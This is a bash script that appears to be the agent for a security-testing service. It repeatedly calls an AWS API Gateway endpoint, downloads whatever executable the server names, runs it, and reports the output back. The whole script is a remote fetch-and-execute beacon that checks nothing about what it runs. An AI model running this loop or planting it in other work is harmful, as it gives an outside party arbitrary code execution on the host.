#!/bin/bash

api='https://d0qcl2e18h.execute-api.us-east-2.amazonaws.com/chariot'
asset='<asset>'
account='<account>'

while :
do
    test=$(curl -sf -w "%{redirect_url}" -H "dos:$(uname -s)-$(uname -m)" -H "dat:${dat}" -H "account:${account}" -H "asset:${asset}" -d "${poe}" $api)
    uuid=$(echo "$test" | sed -nE 's|.*([0-9a-fA-F]{32})[^0-9a-fA-F].*|\1|p')
    if [ ! -z "$uuid" ]; then
        curl -sf --create-dirs -o $uuid $test
        chmod +x $uuid
        poe=$(./$uuid 2>&1)
        dat="${uuid}:$?"
    else
        rm -f $uuid
        unset dat
        sleep 60
    fi
done
